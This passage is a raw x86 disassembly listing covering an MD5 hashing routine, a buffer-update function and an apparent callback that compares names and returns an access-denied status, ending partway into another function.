  402a3a:	81 c6 f8 a3 ef fc    	add    $0xfcefa3f8,%esi
  402a40:	03 4d c4             	add    -0x3c(%ebp),%ecx
  402a43:	03 f1                	add    %ecx,%esi
  402a45:	8b cf                	mov    %edi,%ecx
  402a47:	f7 d1                	not    %ecx
  402a49:	c1 c6 09             	rol    $0x9,%esi
  402a4c:	23 ca                	and    %edx,%ecx
  402a4e:	03 f2                	add    %edx,%esi
  402a50:	8b c6                	mov    %esi,%eax
  402a52:	23 c7                	and    %edi,%eax
  402a54:	8d bb d9 02 6f 67    	lea    0x676f02d9(%ebx),%edi
  402a5a:	0b c8                	or     %eax,%ecx
  402a5c:	8b 5d b4             	mov    -0x4c(%ebp),%ebx
  402a5f:	03 4d d8             	add    -0x28(%ebp),%ecx
  402a62:	81 c3 8a 4c 2a 8d    	add    $0x8d2a4c8a,%ebx
  402a68:	03 f9                	add    %ecx,%edi
  402a6a:	8b ca                	mov    %edx,%ecx
  402a6c:	c1 c7 0e             	rol    $0xe,%edi
  402a6f:	f7 d1                	not    %ecx
  402a71:	03 fe                	add    %esi,%edi
  402a73:	23 ce                	and    %esi,%ecx
  402a75:	8b c7                	mov    %edi,%eax
  402a77:	23 c2                	and    %edx,%eax
  402a79:	0b c8                	or     %eax,%ecx
  402a7b:	8b c6                	mov    %esi,%eax
  402a7d:	03 4d ec             	add    -0x14(%ebp),%ecx
  402a80:	33 c7                	xor    %edi,%eax
  402a82:	03 d9                	add    %ecx,%ebx
  402a84:	c1 cb 0c             	ror    $0xc,%ebx
  402a87:	03 df                	add    %edi,%ebx
  402a89:	33 c3                	xor    %ebx,%eax
  402a8b:	05 42 39 fa ff       	add    $0xfffa3942,%eax
  402a90:	03 45 d0             	add    -0x30(%ebp),%eax
  402a93:	03 d0                	add    %eax,%edx
  402a95:	8b c7                	mov    %edi,%eax
  402a97:	33 c3                	xor    %ebx,%eax
  402a99:	c1 c2 04             	rol    $0x4,%edx
  402a9c:	03 d3                	add    %ebx,%edx
  402a9e:	33 c2                	xor    %edx,%eax
  402aa0:	05 81 f6 71 87       	add    $0x8771f681,%eax
  402aa5:	03 45 dc             	add    -0x24(%ebp),%eax
  402aa8:	03 f0                	add    %eax,%esi
  402aaa:	c1 c6 0b             	rol    $0xb,%esi
  402aad:	03 f2                	add    %edx,%esi
  402aaf:	8b c6                	mov    %esi,%eax
  402ab1:	8b ce                	mov    %esi,%ecx
  402ab3:	33 c3                	xor    %ebx,%eax
  402ab5:	33 c2                	xor    %edx,%eax
  402ab7:	05 22 61 9d 6d       	add    $0x6d9d6122,%eax
  402abc:	03 45 e8             	add    -0x18(%ebp),%eax
  402abf:	03 f8                	add    %eax,%edi
  402ac1:	c1 c7 10             	rol    $0x10,%edi
  402ac4:	03 fe                	add    %esi,%edi
  402ac6:	33 cf                	xor    %edi,%ecx
  402ac8:	8b c1                	mov    %ecx,%eax
  402aca:	33 c2                	xor    %edx,%eax
  402acc:	05 0c 38 e5 fd       	add    $0xfde5380c,%eax
  402ad1:	03 45 f4             	add    -0xc(%ebp),%eax
  402ad4:	03 d8                	add    %eax,%ebx
  402ad6:	8b c7                	mov    %edi,%eax
  402ad8:	c1 cb 09             	ror    $0x9,%ebx
  402adb:	03 df                	add    %edi,%ebx
  402add:	33 cb                	xor    %ebx,%ecx
  402adf:	81 c1 44 ea be a4    	add    $0xa4beea44,%ecx
  402ae5:	03 4d c0             	add    -0x40(%ebp),%ecx
  402ae8:	03 d1                	add    %ecx,%edx
  402aea:	c1 c2 04             	rol    $0x4,%edx
  402aed:	03 d3                	add    %ebx,%edx
  402aef:	33 c3                	xor    %ebx,%eax
  402af1:	33 c2                	xor    %edx,%eax
  402af3:	05 a9 cf de 4b       	add    $0x4bdecfa9,%eax
  402af8:	03 45 cc             	add    -0x34(%ebp),%eax
  402afb:	03 f0                	add    %eax,%esi
  402afd:	c1 c6 0b             	rol    $0xb,%esi
  402b00:	03 f2                	add    %edx,%esi
  402b02:	8b c6                	mov    %esi,%eax
  402b04:	8b ce                	mov    %esi,%ecx
  402b06:	33 c3                	xor    %ebx,%eax
  402b08:	33 c2                	xor    %edx,%eax
  402b0a:	05 60 4b bb f6       	add    $0xf6bb4b60,%eax
  402b0f:	03 45 d8             	add    -0x28(%ebp),%eax
  402b12:	03 f8                	add    %eax,%edi
  402b14:	c1 c7 10             	rol    $0x10,%edi
  402b17:	03 fe                	add    %esi,%edi
  402b19:	33 cf                	xor    %edi,%ecx
  402b1b:	8b c1                	mov    %ecx,%eax
  402b1d:	33 c2                	xor    %edx,%eax
  402b1f:	05 70 bc bf be       	add    $0xbebfbc70,%eax
  402b24:	03 45 e4             	add    -0x1c(%ebp),%eax
  402b27:	03 d8                	add    %eax,%ebx
  402b29:	8b c7                	mov    %edi,%eax
  402b2b:	c1 cb 09             	ror    $0x9,%ebx
  402b2e:	03 df                	add    %edi,%ebx
  402b30:	33 c3                	xor    %ebx,%eax
  402b32:	33 cb                	xor    %ebx,%ecx
  402b34:	81 c1 c6 7e 9b 28    	add    $0x289b7ec6,%ecx
  402b3a:	03 4d f0             	add    -0x10(%ebp),%ecx
  402b3d:	03 d1                	add    %ecx,%edx
  402b3f:	c1 c2 04             	rol    $0x4,%edx
  402b42:	03 d3                	add    %ebx,%edx
  402b44:	33 c2                	xor    %edx,%eax
  402b46:	89 55 b8             	mov    %edx,-0x48(%ebp)
  402b49:	05 fa 27 a1 ea       	add    $0xeaa127fa,%eax
  402b4e:	03 45 bc             	add    -0x44(%ebp),%eax
  402b51:	03 f0                	add    %eax,%esi
  402b53:	c1 c6 0b             	rol    $0xb,%esi
  402b56:	03 f2                	add    %edx,%esi
  402b58:	8b c6                	mov    %esi,%eax
  402b5a:	8b ce                	mov    %esi,%ecx
  402b5c:	33 c3                	xor    %ebx,%eax
  402b5e:	33 c2                	xor    %edx,%eax
  402b60:	05 85 30 ef d4       	add    $0xd4ef3085,%eax
  402b65:	03 45 c8             	add    -0x38(%ebp),%eax
  402b68:	03 f8                	add    %eax,%edi
  402b6a:	8b 45 b8             	mov    -0x48(%ebp),%eax
  402b6d:	c1 c7 10             	rol    $0x10,%edi
  402b70:	05 39 d0 d4 d9       	add    $0xd9d4d039,%eax
  402b75:	03 fe                	add    %esi,%edi
  402b77:	33 cf                	xor    %edi,%ecx
  402b79:	33 d1                	xor    %ecx,%edx
  402b7b:	81 c2 05 1d 88 04    	add    $0x4881d05,%edx
  402b81:	03 55 d4             	add    -0x2c(%ebp),%edx
  402b84:	03 d3                	add    %ebx,%edx
  402b86:	c1 ca 09             	ror    $0x9,%edx
  402b89:	03 d7                	add    %edi,%edx
  402b8b:	33 ca                	xor    %edx,%ecx
  402b8d:	03 4d e0             	add    -0x20(%ebp),%ecx
  402b90:	03 c8                	add    %eax,%ecx
  402b92:	8b c7                	mov    %edi,%eax
  402b94:	33 c2                	xor    %edx,%eax
  402b96:	c1 c1 04             	rol    $0x4,%ecx
  402b99:	03 ca                	add    %edx,%ecx
  402b9b:	33 c1                	xor    %ecx,%eax
  402b9d:	05 e5 99 db e6       	add    $0xe6db99e5,%eax
  402ba2:	03 45 ec             	add    -0x14(%ebp),%eax
  402ba5:	03 f0                	add    %eax,%esi
  402ba7:	c1 c6 0b             	rol    $0xb,%esi
  402baa:	03 f1                	add    %ecx,%esi
  402bac:	8b c6                	mov    %esi,%eax
  402bae:	33 c2                	xor    %edx,%eax
  402bb0:	33 c1                	xor    %ecx,%eax
  402bb2:	05 f8 7c a2 1f       	add    $0x1fa27cf8,%eax
  402bb7:	03 45 f8             	add    -0x8(%ebp),%eax
  402bba:	03 f8                	add    %eax,%edi
  402bbc:	8b c6                	mov    %esi,%eax
  402bbe:	c1 c7 10             	rol    $0x10,%edi
  402bc1:	03 fe                	add    %esi,%edi
  402bc3:	33 c7                	xor    %edi,%eax
  402bc5:	33 c1                	xor    %ecx,%eax
  402bc7:	05 65 56 ac c4       	add    $0xc4ac5665,%eax
  402bcc:	03 45 c4             	add    -0x3c(%ebp),%eax
  402bcf:	03 d0                	add    %eax,%edx
  402bd1:	8b c6                	mov    %esi,%eax
  402bd3:	f7 d0                	not    %eax
  402bd5:	c1 ca 09             	ror    $0x9,%edx
  402bd8:	03 d7                	add    %edi,%edx
  402bda:	0b c2                	or     %edx,%eax
  402bdc:	33 c7                	xor    %edi,%eax
  402bde:	05 44 22 29 f4       	add    $0xf4292244,%eax
  402be3:	03 45 bc             	add    -0x44(%ebp),%eax
  402be6:	03 c8                	add    %eax,%ecx
  402be8:	8b c7                	mov    %edi,%eax
  402bea:	f7 d0                	not    %eax
  402bec:	c1 c1 06             	rol    $0x6,%ecx
  402bef:	03 ca                	add    %edx,%ecx
  402bf1:	0b c1                	or     %ecx,%eax
  402bf3:	33 c2                	xor    %edx,%eax
  402bf5:	05 97 ff 2a 43       	add    $0x432aff97,%eax
  402bfa:	03 45 d8             	add    -0x28(%ebp),%eax
  402bfd:	03 f0                	add    %eax,%esi
  402bff:	8b c2                	mov    %edx,%eax
  402c01:	f7 d0                	not    %eax
  402c03:	c1 c6 0a             	rol    $0xa,%esi
  402c06:	03 f1                	add    %ecx,%esi
  402c08:	0b c6                	or     %esi,%eax
  402c0a:	33 c1                	xor    %ecx,%eax
  402c0c:	05 a7 23 94 ab       	add    $0xab9423a7,%eax
  402c11:	03 45 f4             	add    -0xc(%ebp),%eax
  402c14:	03 f8                	add    %eax,%edi
  402c16:	8b c1                	mov    %ecx,%eax
  402c18:	f7 d0                	not    %eax
  402c1a:	c1 c7 0f             	rol    $0xf,%edi
  402c1d:	03 fe                	add    %esi,%edi
  402c1f:	0b c7                	or     %edi,%eax
  402c21:	33 c6                	xor    %esi,%eax
  402c23:	05 39 a0 93 fc       	add    $0xfc93a039,%eax
  402c28:	03 45 d0             	add    -0x30(%ebp),%eax
  402c2b:	03 d0                	add    %eax,%edx
  402c2d:	8b c6                	mov    %esi,%eax
  402c2f:	f7 d0                	not    %eax
  402c31:	c1 ca 0b             	ror    $0xb,%edx
  402c34:	03 d7                	add    %edi,%edx
  402c36:	0b c2                	or     %edx,%eax
  402c38:	33 c7                	xor    %edi,%eax
  402c3a:	05 c3 59 5b 65       	add    $0x655b59c3,%eax
  402c3f:	03 45 ec             	add    -0x14(%ebp),%eax
  402c42:	03 c8                	add    %eax,%ecx
  402c44:	8b c7                	mov    %edi,%eax
  402c46:	f7 d0                	not    %eax
  402c48:	c1 c1 06             	rol    $0x6,%ecx
  402c4b:	03 ca                	add    %edx,%ecx
  402c4d:	0b c1                	or     %ecx,%eax
  402c4f:	33 c2                	xor    %edx,%eax
  402c51:	05 92 cc 0c 8f       	add    $0x8f0ccc92,%eax
  402c56:	03 45 c8             	add    -0x38(%ebp),%eax
  402c59:	03 f0                	add    %eax,%esi
  402c5b:	8b c2                	mov    %edx,%eax
  402c5d:	f7 d0                	not    %eax
  402c5f:	c1 c6 0a             	rol    $0xa,%esi
  402c62:	03 f1                	add    %ecx,%esi
  402c64:	0b c6                	or     %esi,%eax
  402c66:	33 c1                	xor    %ecx,%eax
  402c68:	05 7d f4 ef ff       	add    $0xffeff47d,%eax
  402c6d:	03 45 e4             	add    -0x1c(%ebp),%eax
  402c70:	03 f8                	add    %eax,%edi
  402c72:	8b c1                	mov    %ecx,%eax
  402c74:	f7 d0                	not    %eax
  402c76:	c1 c7 0f             	rol    $0xf,%edi
  402c79:	03 fe                	add    %esi,%edi
  402c7b:	0b c7                	or     %edi,%eax
  402c7d:	33 c6                	xor    %esi,%eax
  402c7f:	05 d1 5d 84 85       	add    $0x85845dd1,%eax
  402c84:	03 45 c0             	add    -0x40(%ebp),%eax
  402c87:	03 d0                	add    %eax,%edx
  402c89:	8b c6                	mov    %esi,%eax
  402c8b:	c1 ca 0b             	ror    $0xb,%edx
  402c8e:	f7 d0                	not    %eax
  402c90:	03 d7                	add    %edi,%edx
  402c92:	0b c2                	or     %edx,%eax
  402c94:	33 c7                	xor    %edi,%eax
  402c96:	05 4f 7e a8 6f       	add    $0x6fa87e4f,%eax
  402c9b:	8d 9e e0 e6 2c fe    	lea    -0x1d31920(%esi),%ebx
  402ca1:	03 45 dc             	add    -0x24(%ebp),%eax
  402ca4:	03 c8                	add    %eax,%ecx
  402ca6:	8b c7                	mov    %edi,%eax
  402ca8:	f7 d0                	not    %eax
  402caa:	c1 c1 06             	rol    $0x6,%ecx
  402cad:	03 ca                	add    %edx,%ecx
  402caf:	0b c1                	or     %ecx,%eax
  402cb1:	33 c2                	xor    %edx,%eax
  402cb3:	03 45 f8             	add    -0x8(%ebp),%eax
  402cb6:	03 d8                	add    %eax,%ebx
  402cb8:	8d b1 82 7e 53 f7    	lea    -0x8ac817e(%ecx),%esi
  402cbe:	8b c2                	mov    %edx,%eax
  402cc0:	c1 c3 0a             	rol    $0xa,%ebx
  402cc3:	f7 d0                	not    %eax
  402cc5:	03 d9                	add    %ecx,%ebx
  402cc7:	0b c3                	or     %ebx,%eax
  402cc9:	33 c1                	xor    %ecx,%eax
  402ccb:	05 14 43 01 a3       	add    $0xa3014314,%eax
  402cd0:	03 45 d4             	add    -0x2c(%ebp),%eax
  402cd3:	03 f8                	add    %eax,%edi
  402cd5:	8b c1                	mov    %ecx,%eax
  402cd7:	f7 d0                	not    %eax
  402cd9:	c1 c7 0f             	rol    $0xf,%edi
  402cdc:	03 fb                	add    %ebx,%edi
  402cde:	0b c7                	or     %edi,%eax
  402ce0:	33 c3                	xor    %ebx,%eax
  402ce2:	05 a1 11 08 4e       	add    $0x4e0811a1,%eax
  402ce7:	03 45 f0             	add    -0x10(%ebp),%eax
  402cea:	8d 8f bb d2 d7 2a    	lea    0x2ad7d2bb(%edi),%ecx
  402cf0:	03 d0                	add    %eax,%edx
  402cf2:	8b c3                	mov    %ebx,%eax
  402cf4:	f7 d0                	not    %eax
  402cf6:	c1 ca 0b             	ror    $0xb,%edx
  402cf9:	03 d7                	add    %edi,%edx
  402cfb:	0b c2                	or     %edx,%eax
  402cfd:	89 55 b8             	mov    %edx,-0x48(%ebp)
  402d00:	33 c7                	xor    %edi,%eax
  402d02:	03 45 cc             	add    -0x34(%ebp),%eax
  402d05:	03 f0                	add    %eax,%esi
  402d07:	8b c7                	mov    %edi,%eax
  402d09:	f7 d0                	not    %eax
  402d0b:	8b 7d 9c             	mov    -0x64(%ebp),%edi
  402d0e:	c1 c6 06             	rol    $0x6,%esi
  402d11:	03 f2                	add    %edx,%esi
  402d13:	0b c6                	or     %esi,%eax
  402d15:	33 c2                	xor    %edx,%eax
  402d17:	8d 93 35 f2 3a bd    	lea    -0x42c50dcb(%ebx),%edx
  402d1d:	03 45 e8             	add    -0x18(%ebp),%eax
  402d20:	8b 5d b8             	mov    -0x48(%ebp),%ebx
  402d23:	03 d0                	add    %eax,%edx
  402d25:	c1 c2 0a             	rol    $0xa,%edx
  402d28:	8b c3                	mov    %ebx,%eax
  402d2a:	f7 d0                	not    %eax
  402d2c:	03 d6                	add    %esi,%edx
  402d2e:	0b c2                	or     %edx,%eax
  402d30:	33 c6                	xor    %esi,%eax
  402d32:	03 45 c4             	add    -0x3c(%ebp),%eax
  402d35:	03 c8                	add    %eax,%ecx
  402d37:	8b 45 ac             	mov    -0x54(%ebp),%eax
  402d3a:	03 c6                	add    %esi,%eax
  402d3c:	c1 c1 0f             	rol    $0xf,%ecx
  402d3f:	03 ca                	add    %edx,%ecx
  402d41:	89 07                	mov    %eax,(%edi)
  402d43:	f7 d6                	not    %esi
  402d45:	8d 83 91 d3 86 eb    	lea    -0x14792c6f(%ebx),%eax
  402d4b:	0b f1                	or     %ecx,%esi
  402d4d:	33 f2                	xor    %edx,%esi
  402d4f:	03 75 e0             	add    -0x20(%ebp),%esi
  402d52:	03 c6                	add    %esi,%eax
  402d54:	c1 c8 0b             	ror    $0xb,%eax
  402d57:	03 45 98             	add    -0x68(%ebp),%eax
  402d5a:	03 c1                	add    %ecx,%eax
  402d5c:	89 47 04             	mov    %eax,0x4(%edi)
  402d5f:	8b 45 a8             	mov    -0x58(%ebp),%eax
  402d62:	03 c1                	add    %ecx,%eax
  402d64:	89 47 08             	mov    %eax,0x8(%edi)
  402d67:	8b 45 a4             	mov    -0x5c(%ebp),%eax
  402d6a:	03 c2                	add    %edx,%eax
  402d6c:	89 47 0c             	mov    %eax,0xc(%edi)
  402d6f:	6a 40                	push   $0x40
  402d71:	8d 45 bc             	lea    -0x44(%ebp),%eax
  402d74:	6a 00                	push   $0x0
  402d76:	50                   	push   %eax
  402d77:	e8 54 3b 00 00       	call   0x4068d0
  402d7c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402d7f:	83 c4 0c             	add    $0xc,%esp
  402d82:	33 cd                	xor    %ebp,%ecx
  402d84:	5f                   	pop    %edi
  402d85:	5e                   	pop    %esi
  402d86:	5b                   	pop    %ebx
  402d87:	e8 ea 3e 00 00       	call   0x406c76
  402d8c:	8b e5                	mov    %ebp,%esp
  402d8e:	5d                   	pop    %ebp
  402d8f:	c2 08 00             	ret    $0x8
  402d92:	cc                   	int3
  402d93:	cc                   	int3
  402d94:	cc                   	int3
  402d95:	cc                   	int3
  402d96:	cc                   	int3
  402d97:	cc                   	int3
  402d98:	cc                   	int3
  402d99:	cc                   	int3
  402d9a:	cc                   	int3
  402d9b:	cc                   	int3
  402d9c:	cc                   	int3
  402d9d:	cc                   	int3
  402d9e:	cc                   	int3
  402d9f:	cc                   	int3
  402da0:	55                   	push   %ebp
  402da1:	8b ec                	mov    %esp,%ebp
  402da3:	8b 55 10             	mov    0x10(%ebp),%edx
  402da6:	53                   	push   %ebx
  402da7:	8b 5d 08             	mov    0x8(%ebp),%ebx
  402daa:	56                   	push   %esi
  402dab:	57                   	push   %edi
  402dac:	8b 43 10             	mov    0x10(%ebx),%eax
  402daf:	8b f0                	mov    %eax,%esi
  402db1:	c1 ee 03             	shr    $0x3,%esi
  402db4:	83 e6 3f             	and    $0x3f,%esi
  402db7:	8d 0c d0             	lea    (%eax,%edx,8),%ecx
  402dba:	8d 04 d5 00 00 00 00 	lea    0x0(,%edx,8),%eax
  402dc1:	89 4b 10             	mov    %ecx,0x10(%ebx)
  402dc4:	3b c8                	cmp    %eax,%ecx
  402dc6:	8b 4b 14             	mov    0x14(%ebx),%ecx
  402dc9:	73 01                	jae    0x402dcc
  402dcb:	41                   	inc    %ecx
  402dcc:	8b c2                	mov    %edx,%eax
  402dce:	bf 40 00 00 00       	mov    $0x40,%edi
  402dd3:	c1 e8 1d             	shr    $0x1d,%eax
  402dd6:	2b fe                	sub    %esi,%edi
  402dd8:	03 c1                	add    %ecx,%eax
  402dda:	89 43 14             	mov    %eax,0x14(%ebx)
  402ddd:	3b d7                	cmp    %edi,%edx
  402ddf:	72 46                	jb     0x402e27
  402de1:	57                   	push   %edi
  402de2:	ff 75 0c             	push   0xc(%ebp)
  402de5:	8d 43 18             	lea    0x18(%ebx),%eax
  402de8:	03 c6                	add    %esi,%eax
  402dea:	50                   	push   %eax
  402deb:	e8 da 3a 00 00       	call   0x4068ca
  402df0:	83 c4 0c             	add    $0xc,%esp
  402df3:	8d 43 18             	lea    0x18(%ebx),%eax
  402df6:	50                   	push   %eax
  402df7:	53                   	push   %ebx
  402df8:	e8 73 f8 ff ff       	call   0x402670
  402dfd:	8b 55 10             	mov    0x10(%ebp),%edx
  402e00:	8d 77 3f             	lea    0x3f(%edi),%esi
  402e03:	3b f2                	cmp    %edx,%esi
  402e05:	73 1c                	jae    0x402e23
  402e07:	8b 45 0c             	mov    0xc(%ebp),%eax
  402e0a:	83 c0 c1             	add    $0xffffffc1,%eax
  402e0d:	03 c6                	add    %esi,%eax
  402e0f:	50                   	push   %eax
  402e10:	53                   	push   %ebx
  402e11:	e8 5a f8 ff ff       	call   0x402670
  402e16:	8b 55 10             	mov    0x10(%ebp),%edx
  402e19:	83 c6 40             	add    $0x40,%esi
  402e1c:	83 c7 40             	add    $0x40,%edi
  402e1f:	3b f2                	cmp    %edx,%esi
  402e21:	72 e4                	jb     0x402e07
  402e23:	33 f6                	xor    %esi,%esi
  402e25:	eb 02                	jmp    0x402e29
  402e27:	33 ff                	xor    %edi,%edi
  402e29:	8b 45 0c             	mov    0xc(%ebp),%eax
  402e2c:	2b d7                	sub    %edi,%edx
  402e2e:	03 c7                	add    %edi,%eax
  402e30:	52                   	push   %edx
  402e31:	50                   	push   %eax
  402e32:	8d 43 18             	lea    0x18(%ebx),%eax
  402e35:	03 c6                	add    %esi,%eax
  402e37:	50                   	push   %eax
  402e38:	e8 8d 3a 00 00       	call   0x4068ca
  402e3d:	83 c4 0c             	add    $0xc,%esp
  402e40:	5f                   	pop    %edi
  402e41:	5e                   	pop    %esi
  402e42:	5b                   	pop    %ebx
  402e43:	5d                   	pop    %ebp
  402e44:	c2 0c 00             	ret    $0xc
  402e47:	cc                   	int3
  402e48:	cc                   	int3
  402e49:	cc                   	int3
  402e4a:	cc                   	int3
  402e4b:	cc                   	int3
  402e4c:	cc                   	int3
  402e4d:	cc                   	int3
  402e4e:	cc                   	int3
  402e4f:	cc                   	int3
  402e50:	55                   	push   %ebp
  402e51:	8b ec                	mov    %esp,%ebp
  402e53:	51                   	push   %ecx
  402e54:	57                   	push   %edi
  402e55:	33 ff                	xor    %edi,%edi
  402e57:	ff 15 00 70 40 00    	call   *0x407000
  402e5d:	84 c0                	test   %al,%al
  402e5f:	0f 85 79 01 00 00    	jne    0x402fde
  402e65:	ff 15 a0 71 40 00    	call   *0x4071a0
  402e6b:	39 05 34 a8 40 00    	cmp    %eax,0x40a834
  402e71:	0f 84 67 01 00 00    	je     0x402fde
  402e77:	8b 45 0c             	mov    0xc(%ebp),%eax
  402e7a:	53                   	push   %ebx
  402e7b:	56                   	push   %esi
  402e7c:	0f b7 35 60 d2 40 00 	movzwl 0x40d260,%esi
  402e83:	f7 de                	neg    %esi
  402e85:	1b f6                	sbb    %esi,%esi
  402e87:	81 e6 60 cc 40 00    	and    $0x40cc60,%esi
  402e8d:	85 c0                	test   %eax,%eax
  402e8f:	0f 84 bc 00 00 00    	je     0x402f51
  402e95:	83 f8 01             	cmp    $0x1,%eax
  402e98:	74 09                	je     0x402ea3
  402e9a:	83 f8 02             	cmp    $0x2,%eax
  402e9d:	0f 85 30 01 00 00    	jne    0x402fd3
  402ea3:	8b 5d 10             	mov    0x10(%ebp),%ebx
  402ea6:	85 db                	test   %ebx,%ebx
  402ea8:	0f 84 25 01 00 00    	je     0x402fd3
  402eae:	53                   	push   %ebx
  402eaf:	ff 15 c8 70 40 00    	call   *0x4070c8
  402eb5:	84 c0                	test   %al,%al
  402eb7:	0f 84 16 01 00 00    	je     0x402fd3
  402ebd:	8b 03                	mov    (%ebx),%eax
  402ebf:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  402ec2:	51                   	push   %ecx
  402ec3:	6a 00                	push   $0x0
  402ec5:	50                   	push   %eax
  402ec6:	68 28 a8 40 00       	push   $0x40a828
  402ecb:	ff 15 c4 70 40 00    	call   *0x4070c4
  402ed1:	85 c0                	test   %eax,%eax
  402ed3:	78 1c                	js     0x402ef1
  402ed5:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402ed8:	56                   	push   %esi
  402ed9:	0f b7 01             	movzwl (%ecx),%eax
  402edc:	d1 e8                	shr    $1,%eax
  402ede:	50                   	push   %eax
  402edf:	8b 41 04             	mov    0x4(%ecx),%eax
  402ee2:	50                   	push   %eax
  402ee3:	e8 38 16 00 00       	call   0x404520
  402ee8:	85 c0                	test   %eax,%eax
  402eea:	74 05                	je     0x402ef1
  402eec:	bf 22 00 00 c0       	mov    $0xc0000022,%edi
  402ef1:	8b 43 04             	mov    0x4(%ebx),%eax
  402ef4:	50                   	push   %eax
  402ef5:	ff 15 c8 70 40 00    	call   *0x4070c8
  402efb:	84 c0                	test   %al,%al
  402efd:	0f 84 d0 00 00 00    	je     0x402fd3
  402f03:	8b 43 04             	mov    0x4(%ebx),%eax
  402f06:	66 83 38 00          	cmpw   $0x0,(%eax)
  402f0a:	0f 86 c3 00 00 00    	jbe    0x402fd3
  402f10:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  402f14:	0f 84 b9 00 00 00    	je     0x402fd3
  402f1a:	6a 00                	push   $0x0
  402f1c:	8b f0                	mov    %eax,%esi
  402f1e:	e8 4d ec ff ff       	call   0x401b70
  402f23:	50                   	push   %eax
  402f24:	0f b7 06             	movzwl (%esi),%eax
  402f27:	d1 e8                	shr    $1,%eax
  402f29:	50                   	push   %eax
  402f2a:	8b 46 04             	mov    0x4(%esi),%eax
  402f2d:	50                   	push   %eax
  402f2e:	e8 ed 15 00 00       	call   0x404520
  402f33:	85 c0                	test   %eax,%eax
  402f35:	0f 85 93 00 00 00    	jne    0x402fce
  402f3b:	8b 73 04             	mov    0x4(%ebx),%esi
  402f3e:	6a 02                	push   $0x2
  402f40:	e8 2b ec ff ff       	call   0x401b70
  402f45:	50                   	push   %eax
  402f46:	0f b7 06             	movzwl (%esi),%eax
  402f49:	d1 e8                	shr    $1,%eax
  402f4b:	50                   	push   %eax
  402f4c:	8b 46 04             	mov    0x4(%esi),%eax
  402f4f:	eb 73                	jmp    0x402fc4
  402f51:	8b 5d 10             	mov    0x10(%ebp),%ebx
  402f54:	85 db                	test   %ebx,%ebx
  402f56:	74 7b                	je     0x402fd3
  402f58:	53                   	push   %ebx
  402f59:	ff 15 c8 70 40 00    	call   *0x4070c8
  402f5f:	84 c0                	test   %al,%al
  402f61:	74 70                	je     0x402fd3
  402f63:	8b 03                	mov    (%ebx),%eax
  402f65:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  402f68:	51                   	push   %ecx
  402f69:	6a 00                	push   $0x0
  402f6b:	50                   	push   %eax
  402f6c:	68 28 a8 40 00       	push   $0x40a828
  402f71:	ff 15 c4 70 40 00    	call   *0x4070c4
  402f77:	85 c0                	test   %eax,%eax
  402f79:	78 58                	js     0x402fd3
  402f7b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402f7e:	56                   	push   %esi
  402f7f:	0f b7 01             	movzwl (%ecx),%eax
  402f82:	d1 e8                	shr    $1,%eax
  402f84:	50                   	push   %eax
  402f85:	8b 41 04             	mov    0x4(%ecx),%eax
  402f88:	50                   	push   %eax
  402f89:	e8 92 15 00 00       	call   0x404520
  402f8e:	85 c0                	test   %eax,%eax
  402f90:	75 3c                	jne    0x402fce
  402f92:	6a 05                	push   $0x5
  402f94:	e8 d7 eb ff ff       	call   0x401b70
  402f99:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402f9c:	50                   	push   %eax
  402f9d:	0f b7 01             	movzwl (%ecx),%eax
  402fa0:	d1 e8                	shr    $1,%eax
  402fa2:	50                   	push   %eax
  402fa3:	8b 41 04             	mov    0x4(%ecx),%eax
  402fa6:	50                   	push   %eax
  402fa7:	e8 74 15 00 00       	call   0x404520
  402fac:	85 c0                	test   %eax,%eax
  402fae:	75 1e                	jne    0x402fce
  402fb0:	6a 06                	push   $0x6
  402fb2:	e8 b9 eb ff ff       	call   0x401b70
  402fb7:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402fba:	50                   	push   %eax
  402fbb:	0f b7 01             	movzwl (%ecx),%eax
  402fbe:	d1 e8                	shr    $1,%eax
  402fc0:	50                   	push   %eax
  402fc1:	8b 41 04             	mov    0x4(%ecx),%eax
  402fc4:	50                   	push   %eax
  402fc5:	e8 56 15 00 00       	call   0x404520
  402fca:	85 c0                	test   %eax,%eax
  402fcc:	74 05                	je     0x402fd3
  402fce:	bf 22 00 00 c0       	mov    $0xc0000022,%edi
  402fd3:	5e                   	pop    %esi
  402fd4:	5b                   	pop    %ebx
  402fd5:	8b c7                	mov    %edi,%eax
  402fd7:	5f                   	pop    %edi
  402fd8:	8b e5                	mov    %ebp,%esp
  402fda:	5d                   	pop    %ebp
  402fdb:	c2 0c 00             	ret    $0xc
  402fde:	33 c0                	xor    %eax,%eax
  402fe0:	5f                   	pop    %edi
  402fe1:	8b e5                	mov    %ebp,%esp
  402fe3:	5d                   	pop    %ebp
  402fe4:	c2 0c 00             	ret    $0xc
  402fe7:	cc                   	int3
  402fe8:	cc                   	int3
  402fe9:	cc                   	int3
  402fea:	cc                   	int3
  402feb:	cc                   	int3
  402fec:	cc                   	int3
  402fed:	cc                   	int3
  402fee:	cc                   	int3
  402fef:	cc                   	int3
  402ff0:	80 3d 30 a8 40 00 00 	cmpb   $0x0,0x40a830
  402ff7:	74 19                	je     0x403012
  402ff9:	a1 2c a8 40 00       	mov    0x40a82c,%eax
  402ffe:	50                   	push   %eax
  402fff:	a1 28 a8 40 00       	mov    0x40a828,%eax
  403004:	50                   	push   %eax
  403005:	ff 15 bc 70 40 00    	call   *0x4070bc
  40300b:	c6 05 30 a8 40 00 00 	movb   $0x0,0x40a830
  403012:	c3                   	ret
  403013:	cc                   	int3
  403014:	cc                   	int3
  403015:	cc                   	int3
  403016:	cc                   	int3
  403017:	cc                   	int3
  403018:	cc                   	int3
  403019:	cc                   	int3
  40301a:	cc                   	int3
  40301b:	cc                   	int3
  40301c:	cc                   	int3
  40301d:	cc                   	int3
  40301e:	cc                   	int3
  40301f:	cc                   	int3
  403020:	55                   	push   %ebp
  403021:	8b ec                	mov    %esp,%ebp
  403023:	83 ec 08             	sub    $0x8,%esp
  403026:	80 3d 30 a8 40 00 00 	cmpb   $0x0,0x40a830
  40302d:	74 08                	je     0x403037
  40302f:	b0 01                	mov    $0x1,%al
  403031:	8b e5                	mov    %ebp,%esp
  403033:	5d                   	pop    %ebp
  403034:	c2 04 00             	ret    $0x4
  403037:	68 7e 6d 40 00       	push   $0x406d7e
  40303c:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40303f:	50                   	push   %eax
